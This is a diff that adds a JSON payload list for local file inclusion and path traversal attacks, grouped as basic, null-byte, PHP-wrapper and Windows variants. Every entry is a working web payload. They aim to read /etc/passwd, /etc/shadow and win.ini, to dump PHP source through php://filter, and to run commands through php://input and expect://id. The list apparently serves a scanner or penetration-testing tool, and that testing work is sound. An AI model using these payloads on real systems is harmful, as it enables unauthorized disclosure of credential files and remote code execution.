@@ -1,0 +1,21 @@
+{
+    "basic": [
+        "?page=../../etc/passwd",
+        "?file=../../../../../../etc/shadow",
+        "?template=..%2F..%2F..%2Fetc%2Fpasswd",
+        "?lang=../../../../../../../windows/win.ini"
+    ],
+    "null_byte": [
+        "?page=../../etc/passwd%00",
+        "?file=../../../etc/passwd%00.php"
+    ],
+    "php_wrapper": [
+        "?page=php://filter/convert.base64-encode/resource=index.php",
+        "?page=php://input",
+        "?page=expect://id"
+    ],
+    "windows": [
+        "?file=../../boot.ini",
+        "?page=..\\..\\..\\windows\\win.ini"
+    ]
+}
